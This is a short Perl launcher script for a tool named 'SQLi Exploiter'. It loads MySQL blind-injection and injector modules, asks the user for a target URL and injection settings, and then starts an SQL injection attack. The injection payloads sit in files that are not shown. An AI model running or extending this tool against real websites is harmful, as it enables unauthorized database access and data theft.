#!/usr/local/bin/perl

system("cls"); 
system('title SQLi Exploiter by VOİXSEC.BLOGSPOT.COM');
system("color 02");

require "inc/general.pl";
require "MySQL/blind.pl";
require "MySQL/injector.pl";

&generalPrint("".$target,1);

require "inc/whatdo.pl";

@columns_found = ();
$shor_way = 0;
$printer  = "";
$concat   = "";

if(!($target =~ /.+/))
{
	print "Target: ";
	chomp($target = <STDIN>);
}	
if(!($type =~ /\d+/) || !($comment =~ /.+/))
{
	&firstChomp();
}
&startInject();

exit;
